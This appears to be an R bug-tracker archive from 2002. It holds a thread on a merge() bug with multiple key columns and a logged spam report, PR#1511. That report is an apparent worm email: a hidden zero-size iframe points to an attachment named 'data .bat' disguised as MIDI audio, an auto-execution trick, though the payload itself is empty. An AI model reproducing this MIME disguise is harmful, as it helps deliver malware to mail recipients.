+cc: <elff@rumms.uni-mannheim.de>, <R-bugs@biostat.ku.dk>
+Subject: Re: [Rd] merge (PR#1510)
+In-Reply-To: <Pine.A41.4.44.0205030859300.100836-100000@homer39.u.washington.edu>
+Message-ID: <Pine.LNX.4.31.0205031711440.12633-100000@gannet.stats>
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+
+On Fri, 3 May 2002, Thomas Lumley wrote:
+
+> On Fri, 3 May 2002 elff@rumms.uni-mannheim.de wrote:
+>
+> > Full_Name: Martin Elff
+> > Version: 1.5.0
+> > OS: MS Windows 98
+> > Submission from: (NULL) (134.155.91.46)
+> >
+> >
+> > Merging of two data frames by variables with different names
+> > (using by.x and by.y) is no
+> > longer possible (it was possible in version 1.4.1).
+>
+> To be precise, it doesn't seem to work with multiple by columns, so
+> > df<-data.frame(x=1:10,y=rnorm(10))
+> > fd<-data.frame(z=1:10,w=rnorm(10))
+> > merge(df,fd,by.x="x",by.y="z")
+> succeeds but
+
+Yes, and there is an example on the help page for that case.
+
+> > fd<-data.frame(z=1:10,m=letters[1:10],w=rnorm(10))
+> > df<-data.frame(x=1:10,y=rnorm(10),n=letters[1:10])
+> > merge(df,fd,by.x=c("x","n"),by.y=c("z","m"))
+> Error in match.names(clabs, names(xi)) : names don't match previous names:
+>          z, m
+
+Yes, the code is different for multiple match columns, and I know how to
+fix it.
+
+Thank you Thomas for the example: creating one was my next task.
+
+-- 
+Brian D. Ripley,                  ripley@stats.ox.ac.uk
+Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
+University of Oxford,             Tel:  +44 1865 272861 (self)
+1 South Parks Road,                     +44 1865 272860 (secr)
+Oxford OX1 3TG, UK                Fax:  +44 1865 272595
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1511 *
+Subject: PlantGrowth))
+From: me <me@localhost.com>
+Date: Fri,  3 May 2002 19:54:15 +0200 (CEST)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1511 <==
+From postmaster@franz.stat.wisc.edu  Fri May  3 19:55:15 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA17710
+	for <r-bugs@biostat.ku.dk>; Fri, 3 May 2002 19:55:14 +0200 (MET DST)
+Received: from ns.gip.cz (really [217.11.236.97]) by franz.stat.wisc.edu
+	via smail with esmtp
+	id <m173hGL-000Ib0C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Fri, 3 May 2002 12:54:33 -0500 (CDT) 
+Received: from Kucsew (prahae-3-15.dialup.vol.cz [62.177.74.183])
+	by ns.gip.cz (Postfix) with SMTP id C1BC57F00D4
+	for <r-bugs@r-project.org>; Fri,  3 May 2002 19:54:15 +0200 (CEST)
+From: me <me@localhost.com>
+To: r-bugs@r-project.org
+Subject: PlantGrowth))
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary=TBEi7YS28m
+Message-Id: <20020503175415.C1BC57F00D4@ns.gip.cz>
+Date: Fri,  3 May 2002 19:54:15 +0200 (CEST)
+
+--TBEi7YS28m
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD></HEAD><BODY>
+<iframe src=3Dcid:Y2M86TbCD4zx height=3D0 width=3D0>
+</iframe>
+<FONT></FONT></BODY></HTML>
+
+--TBEi7YS28m
+Content-Type: audio/x-midi;
+	name=data .bat
+Content-Transfer-Encoding: base64
+Content-ID: <Y2M86TbCD4zx>
+
+
+--TBEi7YS28m
+--TBEi7YS28m
+Content-Type: application/octet-stream;
+	name=PlantGrowth.html
+Content-Transfer-Encoding: base64
+Content-ID: <Y2M86TbCD4zx>
+
+PGh0bWw+PGhlYWQ+PHRpdGxlPlI6IFJlc3VsdHMgZnJvbSBhbiBFeHBlcmltZW50IG9uIFBs
+YW50IEdyb3d0aDwvdGl0bGU+DQo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQv
+Y3NzIiBocmVmPSIuLi8uLi9SLmNzcyI+DQo8L2hlYWQ+PGJvZHk+DQoNCjx0YWJsZSB3aWR0
+aD0iMTAwJSIgc3VtbWFyeT0icGFnZSBmb3IgUGxhbnRHcm93dGgge2Jhc2V9Ij48dHI+PHRk
+PlBsYW50R3Jvd3RoIHtiYXNlfTwvdGQ+PHRkIGFsaWduPSJyaWdodCI+UiBEb2N1bWVudGF0
+aW9uPC90ZD48L3RyPjwvdGFibGU+DQo8aDI+UmVzdWx0cyBmcm9tIGFuIEV4cGVyaW1lbnQg
+b24gUGxhbnQgR3Jvd3RoPC9oMj4NCg0KDQo8aDM+RGVzY3JpcHRpb248L2gzPg0KDQo8cD4N
+ClJlc3VsdHMgZnJvbSBhbiBleHBlcmltZW50IHRvIGNvbXBhcmUgeWllbGRzIChhcyBtZWFz
+dXJlZCBieSBkcmllZA0Kd2VpZ2h0IG9mIHBsYW50cykgb2J0YWluZWQgdW5kZXIgYSBjb250
+cm9sIGFuZCB0d28gZGlmZmVyZW50IHRyZWF0bWVudA0KY29uZGl0aW9ucy4NCjwvcD4NCg0K
+DQo8aDM+VXNhZ2U8L2gzPg0KDQo8cHJlPmRhdGEoUGxhbnRHcm93dGgpPC9wcmU+DQoNCg0K
+PGgzPkZvcm1hdDwvaDM+DQoNCjxwPg0KQSBkYXRhIGZyYW1lIG9mIDMwIGNhc2VzIG9uIDIg
+dmFyaWFibGVzLg0KPC9wPg0KDQo8dGFibGUgc3VtbWFyeT0iUmQgdGFibGUiPg0KPHRyPg0K
+ICA8dGQgYWxpZ249InJpZ2h0Ij5bLCAxXSA8L3RkPiAgPHRkIGFsaWduPSJsZWZ0Ij4gd2Vp
+Z2h0IDwvdGQ+ICA8dGQgYWxpZ249ImxlZnQiPiBudW1lcmljIDwvdGQ+DQo8L3RyPg0KPHRy
+Pg0KICA8dGQgYWxpZ249InJpZ2h0Ij4gWywgMl0gPC90ZD4gIDx0ZCBhbGlnbj0ibGVmdCI+
+IGdyb3VwICA8L3RkPiAgPHRkIGFsaWduPSJsZWZ0Ij4gZmFjdG9yIDwvdGQ+DQo8L3RyPg0K
+PC90YWJsZT4NCg0KPHA+DQpUaGUgbGV2ZWxzIG9mIDxjb2RlPmdyb3VwPC9jb2RlPiBhcmUg
+YGN0cmwnLCBgdHJ0MScsIGFuZCBgdHJ0MicuDQo8L3A+DQoNCg0KPGgzPlNvdXJjZTwvaDM+
+DQoNCjxwPg0KRG9ic29uLCBBLiBKLiAoMTk4MykNCjxlbT5BbiBJbnRyb2R1Y3Rpb24gdG8g
+U3RhdGlzdGljYWwgTW9kZWxsaW5nLjwvZW0+DQpMb25kb246IENoYXBtYW4gYW5kIEhhbGwu
+DQo8L3A+DQoNCg0KPGgzPkV4YW1wbGVzPC9oMz4NCg0KPHByZT4NCiMjIE9uZSBmYWN0b3Ig
+QU5PVkEgZXhhbXBsZSBmcm9tIERvYnNvbidzIGJvb2ssIGNmLiBUYWJsZSA3LjQ6DQpkYXRh
+KFBsYW50R3Jvd3RoKQ0KYm94cGxvdCh3ZWlnaHQgfiBncm91cCwgZGF0YSA9IFBsYW50R3Jv
+d3RoLCBtYWluID0gIlBsYW50R3Jvd3RoIGRhdGEiLA0KICAgICAgICB5bGFiID0gIkRyaWVk
+IHdlaWdodCBvZiBwbGFudHMiLCBjb2wgPSAibGlnaHRncmF5IiwNCiAgICAgICAgbm90Y2gg
+PSBUUlVFLCB2YXJ3aWR0aCA9IFRSVUUpDQphbm92YShsbSh3ZWlnaHQgfiBncm91cCwgZGF0
+YSA9IFBsYW50R3Jvd3RoKSkNCjwvcHJlPg0KDQo8L2JvZHk+PC9odG1sPg0K
+--TBEi7YS28m--
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
